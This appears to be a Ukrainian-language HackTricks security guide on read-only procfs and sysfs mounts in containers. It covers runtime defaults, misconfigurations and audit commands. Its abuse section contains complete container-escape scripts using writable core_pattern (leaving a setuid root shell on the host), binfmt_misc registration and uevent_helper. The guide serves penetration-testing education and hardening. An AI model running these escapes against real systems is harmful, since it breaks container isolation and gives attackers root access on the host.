# Системні шляхи тільки для читання

{{#include ../../../../banners/hacktricks-training.md}}

Системні шляхи тільки для читання — це окремий механізм захисту від замаскованих шляхів. Замість повного приховування шляху, runtime надає до нього видимість, але монтує його тільки для читання. Це часто застосовується для певних розташувань procfs та sysfs, де доступ для читання може бути прийнятним або необхідним для роботи, але запис був би надто небезпечним.

Мета проста: багато інтерфейсів ядра стають значно небезпечнішими, коли вони доступні для запису. Монтування тільки для читання не усуває всю розвідувальну цінність, але заважає скомпрометованому робочому навантаженню змінювати файли, які взаємодіють із ядром, через цей шлях.

## Принцип роботи

Runtimes часто позначають частини представлення proc/sys як тільки для читання. Залежно від runtime та хоста, це може включати такі шляхи:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Фактичний перелік варіюється, але модель та ж: дозволяти видимість там, де це потрібно, та за замовчуванням забороняти зміну.

## Лаб

Перегляньте список шляхів, оголошених Docker як тільки для читання:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Перегляньте змонтований вигляд proc/sys зсередини контейнера:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Вплив на безпеку

Системні шляхи, змонтовані тільки для читання, звужують велику категорію зловживань, що впливають на хост. Навіть якщо атакуючий може переглядати procfs або sysfs, відсутність можливості запису туди усуває багато прямих шляхів модифікації, пов'язаних із налаштуваннями ядра, обробниками аварій, помічниками завантаження модулів або іншими інтерфейсами керування. Вразливість не зникає повністю, але перехід від розкриття інформації до впливу на хост ускладнюється.

## Неправильні налаштування

Основні помилки — відмаскування або повторне монтування чутливих шляхів у режимі read-write, пряме експонування вмісту хосту proc/sys через writable bind mounts, або використання privileged режимів, які фактично обходять більш безпечні значення runtime за замовчуванням. У Kubernetes, `procMount: Unmasked` і привілейовані workloads часто супроводжуються слабшим захистом proc. Ще одна поширена операційна помилка — припущення, що оскільки runtime зазвичай монтує ці шляхи як read-only, всі workloads автоматично успадковують цей дефолт.

## Зловживання

Якщо захист слабкий, почніть з пошуку записуваних записів у proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Якщо присутні елементи з правом запису, особливо цінні подальші шляхи включають:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Записи з можливістю запису в `/proc/sys` часто означають, що container може змінювати поведінку host kernel, а не лише переглядати її.
- `core_pattern` особливо важливий, бо записуване host-facing значення можна перетворити на шлях виконання коду на host, примусово завершивши процес після встановлення pipe handler.
- `modprobe` вказує на helper, який kernel використовує для потоків, пов'язаних із завантаженням модулів; це класична цінна ціль, якщо доступна для запису.
- `binfmt_misc` повідомляє, чи можлива реєстрація кастомного інтерпретатора. Якщо реєстрація доступна для запису, це може стати execution primitive замість просто інформаційного leak.
- `panic_on_oom` контролює рішення kernel на рівні всього host і тому може перетворити resource exhaustion у host denial of service.
- `uevent_helper` — один із найочевидніших прикладів того, як записуваний sysfs helper path може призвести до виконання в контексті host.

Цікавими знахідками є записувані host-facing proc knobs або sysfs entries, які зазвичай мали б бути лише для читання. У цей момент workload переходить від обмеженого container-перспективи до реального впливу на kernel.

### Повний приклад: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Якщо шлях справді досягає ядра хоста, payload виконується на хості й залишає після себе setuid shell.

### Повний приклад: реєстрація `binfmt_misc`

Якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису, реєстрація власного інтерпретатора може призвести до code execution при виконанні відповідного файлу:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Якщо `binfmt_misc` доступний для запису з боку хоста, це призводить до виконання коду в інтерпретаторі, викликаному ядром.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, ядро може викликати host-path helper, коли спрацьовує відповідна подія:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Причина, чому це так небезпечно, полягає в тому, що шлях допоміжного компонента вирішується з точки зору файлової системи хоста, а не з безпечного контексту, обмеженого лише контейнером.

## Перевірки

Ці перевірки визначають, чи є доступ до procfs/sysfs тільки для читання там, де це очікується, і чи все ще може робоче навантаження змінювати чутливі інтерфейси ядра.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- Звичайний жорстко захищений workload повинен відкривати дуже мало записуваних записів у /proc/sys.
- Записувані `/proc/sys` шляхи часто важливіші за звичайний доступ лише для читання.
- Якщо runtime каже, що шлях лише для читання, але на практиці він записуваний, уважно перевірте mount propagation, bind mounts і налаштування привілеїв.

## Налаштування runtime за замовчуванням

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Поширені ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Docker визначає за замовчуванням список шляхів лише для читання для чутливих записів у /proc | exposing host proc/sys mounts, `--privileged` |
| Podman | Увімкнено за замовчуванням | Podman застосовує стандартні шляхи лише для читання, якщо їх явно не послаблено | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Спадкує налаштування runtime за замовчуванням | Використовує модель шляхів лише для читання підлягаючого runtime, якщо вона не послаблена налаштуваннями Pod або host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | За замовчуванням runtime | Зазвичай покладається на OCI/runtime за замовчуваннями | same as Kubernetes row; direct runtime config changes can weaken the behavior |

Основний висновок: шляхи системи лише для читання зазвичай присутні як налаштування runtime за замовчуванням, але їх легко підірвати через privileged режими або host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
